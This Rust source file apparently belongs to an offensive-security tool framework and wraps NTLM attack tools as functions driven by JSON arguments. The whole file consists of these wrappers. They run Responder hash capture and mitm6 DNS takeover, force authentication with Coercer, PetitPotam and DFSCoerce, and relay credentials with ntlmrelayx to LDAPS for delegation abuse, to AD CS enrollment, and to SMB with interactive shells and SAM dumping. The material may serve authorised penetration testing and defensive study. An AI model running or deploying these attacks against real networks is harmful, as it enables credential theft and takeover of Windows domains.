//! NTLM coercion and relay tool executors.
//!
//! Each function takes a JSON `Value` of arguments and returns a `ToolOutput`
//! produced by running the corresponding CLI tool as a subprocess.

use std::io::Write;

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

// ---------------------------------------------------------------------------
// 1. Responder
// ---------------------------------------------------------------------------

/// Start Responder on a network interface to capture NTLM hashes.
///
/// Optional args: `interface` (default "eth0"), `analyze_mode`
pub async fn start_responder(args: &Value) -> Result<ToolOutput> {
    let interface = optional_str(args, "interface").unwrap_or("eth0");
    let analyze_mode = optional_bool(args, "analyze_mode").unwrap_or(false);

    CommandBuilder::new("responder")
        .flag("-I", interface)
        .arg_if(analyze_mode, "-A")
        .timeout_secs(30)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 2. mitm6
// ---------------------------------------------------------------------------

/// Start mitm6 to perform IPv6 DNS takeover for NTLM relay.
///
/// Required args: `domain`
/// Optional args: `interface` (default "eth0")
pub async fn start_mitm6(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let interface = optional_str(args, "interface").unwrap_or("eth0");

    CommandBuilder::new("mitm6")
        .flag("-d", domain)
        .flag("-i", interface)
        .timeout_secs(30)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 3. Coercer (generic)
// ---------------------------------------------------------------------------

/// Coerce NTLM authentication from a target using all known protocols.
///
/// Required args: `target`, `listener`
/// Optional args: `username`, `password`, `domain`
pub async fn coercer(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let listener = required_str(args, "listener")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("coercer")
        .arg("coerce")
        .flag("-t", target)
        .flag("-l", listener)
        .timeout_secs(120);

    if let Some(u) = username {
        cmd = cmd.flag("-u", u);
    }
    if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }
    if let Some(d) = domain {
        cmd = cmd.flag("-d", d);
    }

    cmd.execute().await
}

// ---------------------------------------------------------------------------
// 4. PetitPotam (MS-EFSR coercion)
// ---------------------------------------------------------------------------

/// Coerce NTLM authentication via MS-EFSR (PetitPotam).
///
/// Required args: `target`, `listener`
/// Optional args: `username`, `password`, `domain`
pub async fn petitpotam(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let listener = required_str(args, "listener")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("coercer")
        .arg("coerce")
        .flag("-t", target)
        .flag("-l", listener)
        .args(["--filter-protocol-name", "MS-EFSR"])
        .timeout_secs(60);

    if let Some(u) = username {
        cmd = cmd.flag("-u", u);
    }
    if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }
    if let Some(d) = domain {
        cmd = cmd.flag("-d", d);
    }

    cmd.execute().await
}

// ---------------------------------------------------------------------------
// 5. DFSCoerce
// ---------------------------------------------------------------------------

/// Coerce NTLM authentication via MS-DFSNM (DFSCoerce).
///
/// Required args: `target`, `listener`
/// Optional args: `username`, `password`, `domain`
pub async fn dfscoerce(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let listener = required_str(args, "listener")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("dfscoerce")
        .flag("-t", target)
        .flag("-l", listener)
        .timeout_secs(60);

    if let Some(u) = username {
        cmd = cmd.flag("-u", u);
    }
    if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }
    if let Some(d) = domain {
        cmd = cmd.flag("-d", d);
    }

    cmd.execute().await
}

// ---------------------------------------------------------------------------
// 6. ntlmrelayx to LDAPS
// ---------------------------------------------------------------------------

/// Relay captured NTLM authentication to LDAPS for delegation abuse.
///
/// Required args: `dc_ip`
/// Optional args: `delegate_access`
pub async fn ntlmrelayx_to_ldaps(args: &Value) -> Result<ToolOutput> {
    let dc_ip = required_str(args, "dc_ip")?;
    let delegate_access = optional_bool(args, "delegate_access").unwrap_or(false);

    let target_url = format!("ldaps://{dc_ip}");

    CommandBuilder::new("impacket-ntlmrelayx")
        .flag("-t", target_url)
        .arg_if(delegate_access, "--delegate-access")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 7. ntlmrelayx to AD CS
// ---------------------------------------------------------------------------

/// Relay captured NTLM authentication to AD CS web enrollment.
///
/// Required args: `ca_host`
/// Optional args: `template`
pub async fn ntlmrelayx_to_adcs(args: &Value) -> Result<ToolOutput> {
    let ca_host = required_str(args, "ca_host")?;
    let template = optional_str(args, "template");

    let target_url = format!("http://{ca_host}/certsrv/certfnsh.asp");

    CommandBuilder::new("impacket-ntlmrelayx")
        .flag("-t", target_url)
        .arg("--adcs")
        .flag_opt("--template", template)
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 8. ntlmrelayx to SMB
// ---------------------------------------------------------------------------

/// Relay captured NTLM authentication to SMB on a target.
///
/// Required args: `target_ip`
/// Optional args: `socks`, `interactive`
pub async fn ntlmrelayx_to_smb(args: &Value) -> Result<ToolOutput> {
    let target_ip = required_str(args, "target_ip")?;
    let socks = optional_bool(args, "socks").unwrap_or(false);
    let interactive = optional_bool(args, "interactive").unwrap_or(false);

    CommandBuilder::new("impacket-ntlmrelayx")
        .flag("-t", target_ip)
        .arg_if(socks, "--socks")
        .arg_if(interactive, "-i")
        .timeout_secs(120)
        .execute()
        .await
}

// ---------------------------------------------------------------------------
// 9. ntlmrelayx multi-relay
// ---------------------------------------------------------------------------

/// Relay captured NTLM authentication to multiple targets.
///
/// Optional args: `targets_file`, `target_ips` (comma-separated), `dump_sam`
///
/// If `target_ips` is provided, writes them to a temp file and uses `-tf`.
/// Otherwise, `targets_file` is used directly with `-tf`.
pub async fn ntlmrelayx_multirelay(args: &Value) -> Result<ToolOutput> {
    let targets_file = optional_str(args, "targets_file");
    let target_ips = optional_str(args, "target_ips");
    let dump_sam = optional_bool(args, "dump_sam").unwrap_or(false);

    let mut cmd = CommandBuilder::new("impacket-ntlmrelayx").timeout_secs(120);

    // Hold the temp file in scope so it lives until execute() completes.
    let _tmp_file;

    if let Some(ips) = target_ips {
        // Write comma-separated IPs as newline-separated entries in a temp file.
        let mut tf = tempfile::NamedTempFile::new()?;
        for ip in ips.split(',') {
            writeln!(tf, "{}", ip.trim())?;
        }
        tf.flush()?;
        let path = tf.path().to_string_lossy().to_string();
        cmd = cmd.flag("-tf", path);
        _tmp_file = Some(tf);
    } else if let Some(tf_path) = targets_file {
        cmd = cmd.flag("-tf", tf_path);
        _tmp_file = None;
    } else {
        _tmp_file = None;
    }

    cmd = cmd.arg_if(dump_sam, "--dump-sam");

    cmd.execute().await
}
